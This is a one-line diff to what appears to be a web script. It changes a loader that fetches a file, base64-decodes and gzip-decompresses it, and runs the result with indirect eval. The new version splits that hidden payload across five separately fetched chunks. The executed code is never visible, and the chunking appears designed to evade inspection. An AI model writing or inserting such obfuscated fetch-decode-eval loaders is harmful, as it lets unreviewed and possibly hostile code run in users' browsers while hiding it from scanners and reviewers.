@@ -1,1 +1,1 @@
-fetch('payload.txt').then(r=>r.text()).then(async b=>{const x=atob(b),u=new Uint8Array(x.length);for(let i=0;i<x.length;i++)u[i]=x.charCodeAt(i);const t=await new Response(new Blob([u]).stream().pipeThrough(new DecompressionStream('gzip'))).text();(0,eval)(t)})
+Promise.all(['p0','p1','p2','p3','p4'].map(x=>fetch(x).then(r=>r.text()))).then(async a=>{const x=atob(a.join('')),u=new Uint8Array(x.length);for(let i=0;i<x.length;i++)u[i]=x.charCodeAt(i);const t=await new Response(new Blob([u]).stream().pipeThrough(new DecompressionStream('gzip'))).text();(0,eval)(t)})
